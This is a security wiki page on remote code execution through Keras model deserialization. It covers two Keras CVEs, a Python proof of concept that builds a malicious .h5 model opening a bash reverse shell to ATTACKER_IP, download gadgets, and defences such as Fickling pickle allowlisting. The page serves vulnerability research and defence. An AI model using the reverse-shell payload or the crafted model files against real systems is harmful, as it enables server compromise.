# Keras Model Deserialization RCE and Gadget Hunting

{{#include ../../banners/hacktricks-training.md}}

This page summarizes practical exploitation techniques against the Keras model deserialization pipeline, explains the native .keras format internals and attack surface, and provides a researcher toolkit for finding Model File Vulnerabilities (MFVs) and post-fix gadgets.

## .keras model format internals

A .keras file is a ZIP archive containing at least:
- metadata.json – generic info (e.g., Keras version)
- config.json – model architecture (primary attack surface)
- model.weights.h5 – weights in HDF5

The config.json drives recursive deserialization: Keras imports modules, resolves classes/functions and reconstructs layers/objects from attacker-controlled dictionaries.

Example snippet for a Dense layer object:

```json
{
  "module": "keras.layers",
  "class_name": "Dense",
  "config": {
    "units": 64,
    "activation": {
      "module": "keras.activations",
      "class_name": "relu"
    },
    "kernel_initializer": {
      "module": "keras.initializers",
      "class_name": "GlorotUniform"
    }
  }
}
```

Deserialization performs:
- Module import and symbol resolution from module/class_name keys
- from_config(...) or constructor invocation with attacker-controlled kwargs
- Recursion into nested objects (activations, initializers, constraints, etc.)

Historically, this exposed three primitives to an attacker crafting config.json:
- Control of what modules are imported
- Control of which classes/functions are resolved
- Control of kwargs passed into constructors/from_config

## CVE-2024-3660 – Lambda-layer bytecode RCE

Root cause:
- Lambda.from_config() used python_utils.func_load(...) which base64-decodes and calls marshal.loads() on attacker bytes; Python unmarshalling can execute code.

Exploit idea (simplified payload in config.json):

```json
{
  "module": "keras.layers",
  "class_name": "Lambda",
  "config": {
    "name": "exploit_lambda",
    "function": {
      "function_type": "lambda",
      "bytecode_b64": "<attacker_base64_marshal_payload>"
    }
  }
}
```

Mitigation:
- Keras enforces safe_mode=True by default. Serialized Python functions in Lambda are blocked unless a user explicitly opts out with safe_mode=False.

Notes:
- Legacy formats (older HDF5 saves) or older codebases may not enforce modern checks, so “downgrade” style attacks can still apply when victims use older loaders.

## CVE-2025-1550 – Arbitrary module import in Keras ≤ 3.8

Root cause:
- _retrieve_class_or_fn used unrestricted importlib.import_module() with attacker-controlled module strings from config.json.
- Impact: Arbitrary import of any installed module (or attacker-planted module on sys.path). Import-time code runs, then object construction occurs with attacker kwargs.

Exploit idea:

```json
{
  "module": "maliciouspkg",
  "class_name": "Danger",
  "config": {"arg": "val"}
}
```

Security improvements (Keras ≥ 3.9):
- Module allowlist: imports restricted to official ecosystem modules: keras, keras_hub, keras_cv, keras_nlp
- Safe mode default: safe_mode=True blocks unsafe Lambda serialized-function loading
- Basic type checking: deserialized objects must match expected types

## Practical exploitation: TensorFlow-Keras HDF5 (.h5) Lambda RCE

Many production stacks still accept legacy TensorFlow-Keras HDF5 model files (.h5). If an attacker can upload a model that the server later loads or runs inference on, a Lambda layer can execute arbitrary Python on load/build/predict.

Minimal PoC to craft a malicious .h5 that executes a reverse shell when deserialized or used:

```python
import tensorflow as tf

def exploit(x):
    import os
    os.system("bash -c 'bash -i >& /dev/tcp/ATTACKER_IP/PORT 0>&1'")
    return x

m = tf.keras.Sequential()
m.add(tf.keras.layers.Input(shape=(64,)))
m.add(tf.keras.layers.Lambda(exploit))
m.compile()
m.save("exploit.h5")  # legacy HDF5 container
```

Notes and reliability tips:
- Trigger points: code may run multiple times (e.g., during layer build/first call, model.load_model, and predict/fit). Make payloads idempotent.
- Version pinning: match the victim’s TF/Keras/Python to avoid serialization mismatches. For example, build artifacts under Python 3.8 with TensorFlow 2.13.1 if that’s what the target uses.
- Quick environment replication:

```dockerfile
FROM python:3.8-slim
RUN pip install tensorflow-cpu==2.13.1
```

- Validation: a benign payload like os.system("ping -c 1 YOUR_IP") helps confirm execution (e.g., observe ICMP with tcpdump) before switching to a reverse shell.

## Post-fix gadget surface inside allowlist

Even with allowlisting and safe mode, a broad surface remains among allowed Keras callables. For example, keras.utils.get_file can download arbitrary URLs to user-selectable locations.

Gadget via Lambda that references an allowed function (not serialized Python bytecode):

```json
{
  "module": "keras.layers",
  "class_name": "Lambda",
  "config": {
    "name": "dl",
    "function": {"module": "keras.utils", "class_name": "get_file"},
    "arguments": {
      "fname": "artifact.bin",
      "origin": "https://example.com/artifact.bin",
      "cache_dir": "/tmp/keras-cache"
    }
  }
}
```

Important limitation:
- Lambda.call() prepends the input tensor as the first positional argument when invoking the target callable. Chosen gadgets must tolerate an extra positional arg (or accept *args/**kwargs). This constrains which functions are viable.

## ML pickle import allowlisting for AI/ML models (Fickling)

Many AI/ML model formats (PyTorch .pt/.pth/.ckpt, joblib/scikit-learn, older TensorFlow artifacts, etc.) embed Python pickle data. Attackers routinely abuse pickle GLOBAL imports and object constructors to achieve RCE or model swapping during load. Blacklist-based scanners often miss novel or unlisted dangerous imports.

A practical fail-closed defense is to hook Python’s pickle deserializer and only allow a reviewed set of harmless ML-related imports during unpickling. Trail of Bits’ Fickling implements this policy and ships a curated ML import allowlist built from thousands of public Hugging Face pickles.

Security model for “safe” imports (intuitions distilled from research and practice): imported symbols used by a pickle must simultaneously:
- Not execute code or cause execution (no compiled/source code objects, shelling out, hooks, etc.)
- Not get/set arbitrary attributes or items
- Not import or obtain references to other Python objects from the pickle VM
- Not trigger any secondary deserializers (e.g., marshal, nested pickle), even indirectly

Enable Fickling’s protections as early as possible in process startup so that any pickle loads performed by frameworks (torch.load, joblib.load, etc.) are checked:

```python
import fickling
# Sets global hooks on the stdlib pickle module
fickling.hook.activate_safe_ml_environment()
```

Operational tips:
- You can temporarily disable/re-enable the hooks where needed:

```python
fickling.hook.deactivate_safe_ml_environment()
# ... load fully trusted files only ...
fickling.hook.activate_safe_ml_environment()
```

- If a known-good model is blocked, extend the allowlist for your environment after reviewing the symbols:

```python
fickling.hook.activate_safe_ml_environment(also_allow=[
    "package.subpackage.safe_symbol",
    "another.safe.import",
])
```

- Fickling also exposes generic runtime guards if you prefer more granular control:
  - fickling.always_check_safety() to enforce checks for all pickle.load()
  - with fickling.check_safety(): for scoped enforcement
  - fickling.load(path) / fickling.is_likely_safe(path) for one-off checks

- Prefer non-pickle model formats when possible (e.g., SafeTensors). If you must accept pickle, run loaders under least privilege without network egress and enforce the allowlist.

This allowlist-first strategy demonstrably blocks common ML pickle exploit paths while keeping compatibility high. In ToB’s benchmark, Fickling flagged 100% of synthetic malicious files and allowed ~99% of clean files from top Hugging Face repos.


## Researcher toolkit

1) Systematic gadget discovery in allowed modules

Enumerate candidate callables across keras, keras_nlp, keras_cv, keras_hub and prioritize those with file/network/process/env side effects.

<details>
<summary>Enumerate potentially dangerous callables in allowlisted Keras modules</summary>

```python
import importlib, inspect, pkgutil

ALLOWLIST = ["keras", "keras_nlp", "keras_cv", "keras_hub"]

seen = set()

def iter_modules(mod):
    if not hasattr(mod, "__path__"):
        return
    for m in pkgutil.walk_packages(mod.__path__, mod.__name__ + "."):
        yield m.name

candidates = []
for root in ALLOWLIST:
    try:
        r = importlib.import_module(root)
    except Exception:
        continue
    for name in iter_modules(r):
        if name in seen:
            continue
        seen.add(name)
        try:
            m = importlib.import_module(name)
        except Exception:
            continue
        for n, obj in inspect.getmembers(m):
            if inspect.isfunction(obj) or inspect.isclass(obj):
                sig = None
                try:
                    sig = str(inspect.signature(obj))
                except Exception:
                    pass
                doc = (inspect.getdoc(obj) or "").lower()
                text = f"{name}.{n} {sig} :: {doc}"
                # Heuristics: look for I/O or network-ish hints
                if any(x in doc for x in ["download", "file", "path", "open", "url", "http", "socket", "env", "process", "spawn", "exec"]):
                    candidates.append(text)

print("\n".join(sorted(candidates)[:200]))
```

</details>

2) Direct deserialization testing (no .keras archive needed)

Feed crafted dicts directly into Keras deserializers to learn accepted params and observe side effects.

```python
from keras import layers

cfg = {
  "module": "keras.layers",
  "class_name": "Lambda",
  "config": {
    "name": "probe",
    "function": {"module": "keras.utils", "class_name": "get_file"},
    "arguments": {"fname": "x", "origin": "https://example.com/x"}
  }
}

layer = layers.deserialize(cfg, safe_mode=True)  # Observe behavior
```

3) Cross-version probing and formats

Keras exists in multiple codebases/eras with different guardrails and formats:
- TensorFlow built-in Keras: tensorflow/python/keras (legacy, slated for deletion)
- tf-keras: maintained separately
- Multi-backend Keras 3 (official): introduced native .keras

Repeat tests across codebases and formats (.keras vs legacy HDF5) to uncover regressions or missing guards.

## References

- [Hunting Vulnerabilities in Keras Model Deserialization (huntr blog)](https://blog.huntr.com/hunting-vulnerabilities-in-keras-model-deserialization)
- [Keras PR #20751 – Added checks to serialization](https://github.com/keras-team/keras/pull/20751)
- [CVE-2024-3660 – Keras Lambda deserialization RCE](https://nvd.nist.gov/vuln/detail/CVE-2024-3660)
- [CVE-2025-1550 – Keras arbitrary module import (≤ 3.8)](https://nvd.nist.gov/vuln/detail/CVE-2025-1550)
- [huntr report – arbitrary import #1](https://huntr.com/bounties/135d5dcd-f05f-439f-8d8f-b21fdf171f3e)
- [huntr report – arbitrary import #2](https://huntr.com/bounties/6fcca09c-8c98-4bc5-b32c-e883ab3e4ae3)
- [HTB Artificial – TensorFlow .h5 Lambda RCE to root](https://0xdf.gitlab.io/2025/10/25/htb-artificial.html)

{{#include ../../banners/hacktricks-training.md}}
